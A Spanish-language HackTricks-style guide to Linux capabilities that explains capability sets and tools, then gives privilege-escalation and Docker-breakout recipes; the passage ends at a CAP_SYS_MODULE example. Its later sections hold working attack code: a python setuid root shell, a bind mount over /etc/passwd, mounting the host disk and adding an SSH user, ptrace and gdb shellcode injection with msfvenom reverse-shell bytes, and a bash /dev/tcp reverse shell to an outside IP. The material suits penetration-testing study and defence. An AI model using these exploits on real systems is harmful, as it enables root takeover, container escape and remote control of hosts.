# Capacidades de Linux

{{#include ../../banners/hacktricks-training.md}}

Las capacidades de Linux dividen los **privilegios de root en unidades más pequeñas y diferenciadas**, lo que permite que los procesos tengan un subconjunto de privilegios. Esto minimiza los riesgos al no conceder innecesariamente privilegios completos de root.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### El problema:

- Los usuarios normales tienen permisos limitados para operaciones como abrir raw sockets o asociar puertos de Internet inferiores a 1024; las capacidades pueden conceder únicamente la operación requerida en lugar de privilegios completos de root.<sup>[[14]](#references)</sup>

### Conjuntos de capacidades:

Linux expone estos conjuntos de capacidades por thread, y el kernel aplica sus restricciones cuando un proceso cambia sus credenciales o ejecuta un archivo.<sup>[[14]](#references)</sup>

1. **Heredado (CapInh)**:

- **Propósito**: Identifica las capacidades que pueden contribuir al conjunto permitido después de `execve()` cuando el archivo ejecutado tiene capacidades de archivo heredables coincidentes.
- **Funcionalidad**: El conjunto heredable del thread se conserva a través de `execve()`; por sí mismo, no hace que esas capacidades sean efectivas.
- **Restricciones**: Añadir una capacidad a este conjunto está limitado por los conjuntos permitido y bounding.<sup>[[14]](#references)</sup>

2. **Efectivo (CapEff)**:

- **Propósito**: Representa las capacidades reales que un proceso está utilizando en un momento dado.
- **Funcionalidad**: Es el conjunto de capacidades que el kernel comprueba para conceder permisos para diversas operaciones. En el caso de los archivos, este conjunto puede ser un indicador de si las capacidades permitidas del archivo deben considerarse efectivas.
- **Importancia**: El conjunto efectivo es crucial para las comprobaciones inmediatas de privilegios, ya que actúa como el conjunto activo de capacidades que un proceso puede utilizar.

3. **Permitido (CapPrm)**:

- **Propósito**: Define el conjunto máximo de capacidades que un proceso puede poseer.
- **Funcionalidad**: Un proceso puede elevar una capacidad del conjunto permitido a su conjunto efectivo, obteniendo la capacidad de utilizarla. También puede eliminar capacidades de su conjunto permitido.
- **Límite**: Si una capacidad se elimina de este conjunto, normalmente no puede restaurarse sin ejecutar un archivo que la conceda u otra transición privilegiada.<sup>[[14]](#references)</sup>

4. **Bounding (CapBnd)**:

- **Propósito**: Limita las capacidades que un proceso puede obtener de un archivo durante `execve()` y las que puede añadir a su conjunto heredable.
- **Funcionalidad**: El conjunto se hereda a través de `fork()` y se conserva a través de `execve()`; las capacidades pueden eliminarse de él cuando el caller tiene `CAP_SETPCAP`.
- **Caso de uso**: Eliminar capacidades innecesarias de este conjunto limita la adquisición posterior de privilegios.<sup>[[14]](#references)</sup>

5. **Ambient (CapAmb)**:
- **Propósito**: Permite que determinadas capacidades permanezcan permitidas y efectivas a través de `execve()` de un programa no privilegiado.
- **Funcionalidad**: Las capacidades ambient se añaden a los nuevos conjuntos permitido y efectivo cuando el archivo ejecutado no es privilegiado.
- **Restricciones**: Una capacidad solo puede ser ambient mientras esté presente tanto en los conjuntos permitido como heredable; ejecutar un archivo set-user-ID/set-group-ID o un archivo con capacidades borra el conjunto ambient.<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## Capacidades de Processes & Binaries

### Capacidades de Processes

Para ver las capacidades de un proceso concreto, utiliza el archivo **status** del directorio /proc. Como proporciona más detalles, limitémoslo únicamente a la información relacionada con las capacidades de Linux.\
Ten en cuenta que, para todos los procesos en ejecución, la información de capacidades se mantiene por thread, mientras que las capacidades de archivo se almacenan en atributos extendidos `security.capability`.<sup>[[14]](#references)[[15]](#references)</sup>

Puedes encontrar las capacidades definidas en /usr/include/linux/capability.h

Puedes encontrar las capacidades del proceso actual mediante `cat /proc/self/status` o con `capsh --print`, y las de otros procesos en `/proc/<pid>/status`.<sup>[[15]](#references)[[26]](#references)</sup>
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Este comando debería devolver cinco líneas de capabilities en la mayoría de los sistemas.<sup>[[15]](#references)</sup>

- CapInh = Capabilities heredadas
- CapPrm = Capabilities permitidas
- CapEff = Capabilities efectivas
- CapBnd = Bounding set
- CapAmb = Conjunto de capabilities Ambient
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Estos números hexadecimales no tienen sentido. Usando la utilidad `capsh`, podemos decodificarlos en nombres de capabilities.<sup>[[26]](#references)</sup>
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Comprobemos ahora las **capabilities** utilizadas por `ping`:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Aunque esto funciona, existe otra forma más sencilla. Para ver las capabilities de un proceso en ejecución, usa la herramienta **getpcaps** seguida de su ID de proceso (PID); también acepta una lista de ID de procesos.<sup>[[22]](#references)</sup>
```bash
getpcaps 1234
```
Comprobemos las capabilities de `tcpdump` después de asignar las capabilities `cap_net_admin` y `cap_net_raw` al binario para sniffear la red (`tcpdump` se está ejecutando en el proceso 9562).<sup>[[22]](#references)[[25]](#references)</sup>
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Como puedes ver, las capabilities corresponden con los resultados de las dos formas de inspeccionar un proceso. La herramienta `getpcaps` utiliza libcap para consultar las capabilities de un proceso objetivo y las muestra en formato de texto; acepta uno o más PID.<sup>[[22]](#references)</sup>

### Capacidades de los binarios

Los binarios pueden tener file capabilities que se aplican durante la ejecución. Por ejemplo, un binario `ping` puede incluir la capability `cap_net_raw`.<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Puedes **buscar binarios con capabilities** usando `getcap -r`.<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### Eliminación de capabilities con capsh

Si eliminamos `CAP_NET_RAW` del bounding set vigente, un programa que necesite esa capability ya no debería poder usarla.<sup>[[26]](#references)</sup>
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Además de la salida del propio _capsh_, el propio comando _tcpdump_ también debería mostrar un error.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

El error muestra que `tcpdump` no puede ejecutarse con la file capability solicitada después de eliminar `CAP_NET_RAW` del bounding set.

### Eliminar Capabilities

Puedes eliminar las capabilities de un archivo con `setcap -r`.<sup>[[25]](#references)</sup>
```bash
setcap -r </path/to/binary>
```
## Capacidades de usuario

Linux no asigna file capabilities directamente a un usuario de inicio de sesión, pero el módulo PAM `pam_cap` puede establecer capabilities heredables para sesiones autenticadas mediante `/etc/security/capability.conf`.<sup>[[16]](#references)</sup> Cada entrada asigna nombres o números de capabilities separados por comas a uno o más nombres de usuario.<sup>[[17]](#references)</sup>
Ejemplo de archivo:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Capacidades del entorno

Compilar el siguiente programa permite **spawn un bash shell dentro de un entorno que proporciona capabilities**.<sup>[[14]](#references)</sup>
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Dentro de **bash ejecutado por el binario ambient compilado**, es posible observar las **nuevas capabilities** (un usuario normal no tendrá ninguna capability en la sección "current").<sup>[[14]](#references)</sup>
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> Solo puedes añadir capabilities que estén presentes tanto en los conjuntos permitidos como en los heredables.<sup>[[14]](#references)</sup>

### Binaries que entienden capabilities/binaries que no entienden capabilities

Un binary que no entiende capabilities es un programa con file capabilities que no utiliza libcap para gestionarlas. Si su file effective bit está establecido, el kernel habilita las capabilities permitidas del archivo en el effective set del proceso; la ejecución puede fallar si el proceso no obtuvo todas las capabilities permitidas.<sup>[[14]](#references)</sup>

## Capabilities de servicios

Un servicio del sistema que se ejecuta como root puede conservar capabilities amplias a menos que su entorno de ejecución las restrinja. En una unidad de systemd, `User=` selecciona el usuario del servicio y `AmbientCapabilities=` añade las capabilities especificadas al ambient set del proceso ejecutado.<sup>[[18]](#references)</sup>
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capabilities en Docker Containers

Docker inicia los containers con un conjunto de capabilities predeterminado que puede modificarse con `--cap-add` y `--cap-drop`; un container de ejemplo puede inspeccionarse con `amicontained`.<sup>[[19]](#references)[[24]](#references)</sup>
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Las capabilities son útiles cuando **quieres restringir tus propios procesos después de realizar operaciones privilegiadas** (por ejemplo, después de configurar chroot y vincularte a un socket). Sin embargo, pueden explotarse pasando comandos o argumentos maliciosos que posteriormente se ejecutan como root.<sup>[[2]](#references)</sup>

Puedes forzar capabilities de archivo en los programas con `setcap` y consultarlas con `getcap`.<sup>[[23]](#references)[[25]](#references)</sup>
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
Para el texto de file-capability, `+ep` eleva la capability indicada en los conjuntos effective y permitted; `-` reduce los flags seleccionados.<sup>[[21]](#references)</sup>

Para identificar programas en un sistema o carpeta que tengan capabilities, usa `getcap -r`.<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### Ejemplo de explotación

En el siguiente ejemplo, se encuentra que el binario `/usr/bin/python2.6` es vulnerable a privesc:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capabilities** necesarias para que `tcpdump` **permita a cualquier usuario hacer sniffing de paquetes**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### El caso especial de las capabilities "vacías"

Un archivo puede contener un conjunto de capabilities vacío (`getcap myelf` devuelve `myelf =ep`). Un conjunto vacío no concede ninguna capability; cuando se combina con un bit set-user-ID propiedad de root, el programa aún puede cambiar los IDs efectivos y guardados del proceso en ejecución a 0 sin obtener file capabilities. Un archivo sin propietario y que no sea SUID/SGID con `=ep` no se ejecuta como root.<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** es una capability de Linux muy potente, a menudo equiparada a un nivel casi root debido a sus amplios **privilegios administrativos**, como montar dispositivos o manipular características del kernel. Aunque es indispensable para los contenedores que simulan sistemas completos, **`CAP_SYS_ADMIN` plantea importantes desafíos de seguridad**, especialmente en entornos containerizados, debido a su potencial para la escalada de privilegios y el compromiso del sistema. Por lo tanto, su uso requiere evaluaciones de seguridad rigurosas y una gestión cuidadosa, con una clara preferencia por eliminar esta capability en contenedores específicos para aplicaciones, para cumplir con el **principio de mínimo privilegio** y minimizar la superficie de ataque.<sup>[[14]](#references)</sup>

**Ejemplo con binario**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Usando Python puedes montar un archivo _passwd_ modificado sobre el archivo _passwd_ real:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
Y por último, **monta** el archivo `passwd` modificado en `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
Y podrás hacer **`su` como root** usando la contraseña "password".

**Ejemplo con el entorno (Docker breakout)**

Puedes comprobar las capabilities habilitadas dentro del contenedor de Docker usando:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
En la salida anterior se puede ver que la capability SYS_ADMIN está habilitada.<sup>[[14]](#references)</sup>

- **Mount**

Con el acceso adecuado al dispositivo y al namespace, esto puede permitir que un contenedor Docker **monte un disco del host y acceda a su contenido**.<sup>[[14]](#references)</sup>
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **Acceso completo**

En el método anterior conseguimos acceder al disco de un host.\
Si el host está ejecutando un servidor **ssh**, podrías **crear un usuario dentro del disco montado** y acceder mediante SSH.<sup>[[14]](#references)</sup>
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

Con `CAP_SYS_PTRACE`, un proceso puede rastrear e inspeccionar otros procesos visibles en su PID namespace. Para dirigirse a procesos del host desde un contenedor Docker, comparte el PID namespace del host con `--pid=host` (o únete a un namespace que contenga el objetivo).<sup>[[14]](#references)[[20]](#references)</sup>

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** concede la capacidad de utilizar las funcionalidades de depuración y rastreo de system calls proporcionadas por `ptrace(2)` y las llamadas de acceso entre memorias, como `process_vm_readv(2)` y `process_vm_writev(2)`. Aunque es potente para fines de diagnóstico y monitorización, si `CAP_SYS_PTRACE` está habilitado sin medidas restrictivas, como un filtro seccomp en `ptrace(2)`, puede debilitar considerablemente la seguridad del sistema. En concreto, puede explotarse para eludir otras restricciones de seguridad, especialmente las impuestas por seccomp, como demuestran [proofs of concept (PoC) como este](https://gist.github.com/thejh/8346f47e359adecd1d53).<sup>[[10]](#references)</sup>

**Ejemplo con binario (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Ejemplo con binary (gdb)**

`gdb` con capability `ptrace`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Crea un shellcode con msfvenom para inyectarlo en memoria mediante gdb
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Depura un proceso root con gdb y copia y pega las líneas de gdb generadas previamente:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Ejemplo con entorno (Docker breakout) - Otro Abuse de gdb**

Si **GDB** está instalado (o puedes instalarlo con `apk add gdb` o `apt install gdb`, por ejemplo), puedes **depurar un proceso desde el host** y hacer que llame a la función `system`. (Esta técnica también requiere la capability `SYS_ADMIN`)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
No podrás ver la salida del comando ejecutado, pero será ejecutado por ese proceso (así que obtén una rev shell).

> [!WARNING]
> Si obtienes el error "No symbol "system" in current context.", revisa el ejemplo anterior sobre cómo cargar un shellcode en un programa mediante gdb.

**Example with environment (Docker breakout) - Shellcode Injection**

Puedes comprobar las capabilities habilitadas dentro del contenedor de Docker usando:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Lista los **procesos** que se ejecutan en el **host** `ps -eaf`

1. Obtén la **arquitectura** `uname -m`
2. Encuentra un **shellcode** para la arquitectura ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Encuentra un **programa** para **inyectar** el **shellcode** en la memoria de un proceso ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Modifica** el **shellcode** dentro del programa y **compílalo** `gcc inject.c -o inject`
5. **Inyéctalo** y obtén tu **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** permite a un proceso **cargar y descargar módulos del kernel (llamadas al sistema `init_module(2)`, `finit_module(2)` y `delete_module(2)`)**, proporcionando acceso directo a las operaciones principales del kernel. Esta capability presenta riesgos críticos de seguridad, ya que cargar un módulo puede modificar el comportamiento del kernel y puede eludir los límites de aislamiento.<sup>[[6]](#references)[[14]](#references)</sup>
**Esto permite insertar o eliminar módulos en el kernel visible para el proceso; en un contenedor, que afecte al kernel del host depende de la configuración de aislamiento**.<sup>[[14]](#references)</sup>

**Ejemplo con un binario**

En el siguiente ejemplo, el binario **`python`** tiene esta capability.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
De forma predeterminada, el comando **`modprobe`** comprueba los archivos de lista de dependencias y de mapeo en el directorio **`/lib/modules/$(uname -r)`**.\
Para abusar de esto, creemos una carpeta **lib/modules** falsa:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Luego, **compila el módulo del kernel que puedes encontrar en los 2 ejemplos siguientes y cópialo** a esta carpeta:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Finalmente, ejecuta el código Python necesario para cargar este módulo del kernel:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Ejemplo 2 con binary**

En el siguiente ejemplo, el binary **`kmod`** tiene esta capability.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Lo que significa que es posible usar el comando **`insmod`** para insertar un módulo del kernel. Sigue el siguiente ejemplo para obtener un **reverse shell** abusando de este privilegio.

**Ejemplo con entorno (Docker breakout)**

Puedes comprobar las capabilities habilitadas dentro del contenedor de Docker usando:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
